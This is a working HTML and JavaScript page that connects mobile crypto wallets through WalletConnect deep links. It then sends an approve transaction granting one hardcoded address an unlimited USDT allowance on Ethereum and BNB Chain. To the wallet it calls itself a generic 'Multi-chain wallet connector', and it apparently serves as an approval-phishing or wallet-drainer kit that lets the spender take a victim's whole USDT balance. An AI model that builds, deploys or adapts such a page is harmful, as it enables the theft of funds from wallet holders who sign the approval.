<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>EVM 链 USDT 无限授权</title>
    <style>
        /* 样式同前，略 */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: system-ui; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .card { background: white; border-radius: 24px; padding: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; color: #333; margin-bottom: 8px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
        .chain-selector { display: flex; gap: 12px; margin-bottom: 24px; flex-wrap: wrap; }
        .chain-btn { flex: 1; padding: 12px; border: 2px solid #e0e0e0; background: white; border-radius: 12px; cursor: pointer; font-weight: 500; }
        .chain-btn.active { border-color: #667eea; background: #f0f0ff; color: #667eea; }
        .wallet-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
        .wallet-item { display: flex; align-items: center; padding: 16px; border: 1px solid #e0e0e0; border-radius: 16px; cursor: pointer; background: white; }
        .wallet-item.selected { border-color: #667eea; background: #f8f9ff; }
        .wallet-icon { width: 48px; height: 48px; background: #f5f5f5; display: flex; align-items: center; justify-content: center; margin-right: 16px; font-size: 24px; border-radius: 12px; }
        .wallet-name { font-weight: 600; color: #333; }
        .approve-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 16px; }
        .status { margin-top: 16px; padding: 12px; border-radius: 12px; font-size: 14px; text-align: center; }
        .status.loading { background: #fff3cd; color: #856404; }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        .hidden { display: none; }
        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #f3f3f3; border-top: 2px solid #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-box { background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 16px; }
        .info-label { font-size: 12px; color: #666; }
        .info-value { font-size: 12px; color: #333; word-break: break-all; margin-top: 4px; }
        .info-text { font-size: 12px; color: #999; margin-top: 12px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>🔐 USDT 授权</h1>
            <div class="subtitle">EVM 链 - 无限额度授权 (WalletConnect)</div>
            
            <div class="chain-selector" id="chainSelector">
                <button class="chain-btn active" data-chain="1">Ethereum</button>
                <button class="chain-btn" data-chain="56">BNB Chain</button>
            </div>
            
            <div class="wallet-list" id="walletList"></div>
            
            <div class="info-box">
                <div class="info-label">授权地址</div>
                <div class="info-value" id="spenderDisplay">0xEe435a366f0c89BE2108f8b02fFDe366158effa1</div>
                <div class="info-label" style="margin-top: 12px;">授权额度</div>
                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度</div>
            </div>
            
            <button class="approve-btn" id="approveBtn">连接钱包并授权</button>
            <div class="status hidden" id="status"></div>
            <div id="infoText" class="info-text">请选择链和钱包</div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.6/dist/index.min.js"></script>
    <script>
        // 配置
        const PROJECT_ID = '91bd623c7859e77a38c7b10c615976b6';
        const USDT_ADDRESS = {
            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            56: '0x55d398326f99059fF775485246999027B3197955'
        };
        const SPENDER_ADDRESS = {
            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1'
        };
        const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        // 钱包列表（仅用于 UI）
        const EVM_WALLETS = [
            { key: 'metamask', name: 'MetaMask', icon: '🦊', scheme: 'metamask://' },
            { key: 'tokenpocket', name: 'TokenPocket', icon: '🎫', scheme: 'tp://' },
            { key: 'imtoken', name: 'imToken', icon: '🔷', scheme: 'imtokenv2://' },
            { key: 'trust', name: 'Trust Wallet', icon: '🔒', scheme: 'trust://' }
        ];
        
        let currentChain = '1';
        let selectedWallet = null;
        let provider = null;
        
        function showStatus(message, type = 'loading') {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
            statusEl.className = `status ${type}`;
            statusEl.classList.remove('hidden');
        }
        
        function hideStatus() {
            document.getElementById('status').classList.add('hidden');
        }
        
        function updateInfoText(text) {
            document.getElementById('infoText').textContent = text;
        }
        
        function updateSpenderDisplay() {
            document.getElementById('spenderDisplay').textContent = SPENDER_ADDRESS[currentChain];
        }
        
        function renderWalletList() {
            const container = document.getElementById('walletList');
            container.innerHTML = EVM_WALLETS.map(wallet => `
                <div class="wallet-item" data-wallet="${wallet.key}">
                    <div class="wallet-icon">${wallet.icon}</div>
                    <div class="wallet-info">
                        <div class="wallet-name">${wallet.name}</div>
                    </div>
                </div>
            `).join('');
            document.querySelectorAll('.wallet-item').forEach(item => {
                item.addEventListener('click', () => {
                    selectedWallet = item.dataset.wallet;
                    document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                    item.classList.add('selected');
                    hideStatus();
                    updateInfoText(`已选择 ${EVM_WALLETS.find(w => w.key === selectedWallet).name}，点击按钮授权`);
                });
            });
        }
        
        async function connectAndApprove() {
            if (!selectedWallet) {
                showStatus('请先选择钱包', 'error');
                return;
            }
            
            const wallet = EVM_WALLETS.find(w => w.key === selectedWallet);
            const chainId = parseInt(currentChain);
            
            showStatus('正在初始化连接...', 'loading');
            updateInfoText('正在生成 WalletConnect 链接');
            
            try {
                // 创建 EthereumProvider 实例
                const ethProvider = await EthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: [chainId],
                    optionalChains: [1, 56],
                    showQrModal: false,
                    qrModalOptions: { themeMode: 'light' },
                    metadata: {
                        name: 'Wallet Connector',
                        description: 'Multi-chain wallet connector',
                        url: window.location.origin,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });
                
                const uri = ethProvider.uri;
                if (!uri) throw new Error('无法生成连接 URI');
                
                console.log('WC URI:', uri);
                
                // 构建 Deep Link
                const encodedUri = encodeURIComponent(uri);
                let deepLink = '';
                switch (selectedWallet) {
                    case 'metamask':
                        deepLink = `metamask://wc?uri=${encodedUri}`;
                        break;
                    case 'tokenpocket':
                        deepLink = `tp://wc?wc_uri=${encodedUri}`;
                        break;
                    case 'imtoken':
                        deepLink = `imtokenv2://wc?uri=${encodedUri}`;
                        break;
                    case 'trust':
                        deepLink = `trust://wc?uri=${encodedUri}`;
                        break;
                    default:
                        deepLink = uri;
                }
                
                showStatus(`正在唤起 ${wallet.name}...`, 'loading');
                updateInfoText('请在钱包中确认连接');
                window.location.href = deepLink;
                
                // 监听连接事件
                ethProvider.on('connect', async (session) => {
                    console.log('连接成功', session);
                    updateInfoText('连接成功，正在发送授权交易...');
                    provider = new ethers.providers.Web3Provider(ethProvider);
                    const signer = provider.getSigner();
                    const address = await signer.getAddress();
                    updateInfoText(`已连接: ${address.slice(0, 6)}...${address.slice(-4)}`);
                    
                    // 发送授权交易
                    const usdtContract = new ethers.Contract(
                        USDT_ADDRESS[chainId],
                        ['function approve(address spender, uint256 amount) returns (bool)'],
                        signer
                    );
                    showStatus('正在发送授权交易...', 'loading');
                    const tx = await usdtContract.approve(SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT);
                    showStatus('交易已发送，等待确认...', 'loading');
                    const receipt = await tx.wait();
                    showStatus(`✅ 授权成功！`, 'success');
                    updateInfoText(`授权成功！交易ID: ${receipt.transactionHash.slice(0, 10)}...`);
                });
                
                ethProvider.on('disconnect', () => {
                    console.log('断开连接');
                    updateInfoText('连接已断开');
                });
                
                // 超时检测
                setTimeout(() => {
                    if (!document.hidden && !document.webkitHidden) {
                        updateInfoText('未检测到钱包响应，请确保钱包已安装');
                    }
                }, 5000);
                
            } catch (error) {
                console.error('连接失败:', error);
                showStatus('连接失败: ' + error.message, 'error');
                updateInfoText('连接失败，请重试');
            }
        }
        
        function onChainChange(chainId) {
            currentChain = chainId;
            selectedWallet = null;
            document.getElementById('walletList').innerHTML = '';
            renderWalletList();
            updateSpenderDisplay();
            hideStatus();
            updateInfoText('EVM 链，选择钱包后点击授权（将唤起钱包）');
        }
        
        function init() {
            // 链选择器
            document.querySelectorAll('.chain-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    document.querySelectorAll('.chain-btn').forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    onChainChange(btn.dataset.chain);
                });
            });
            document.getElementById('approveBtn').addEventListener('click', connectAndApprove);
            renderWalletList();
            updateSpenderDisplay();
            updateInfoText('请选择链和钱包');
        }
        
        init();
    </script>
</body>
</html>
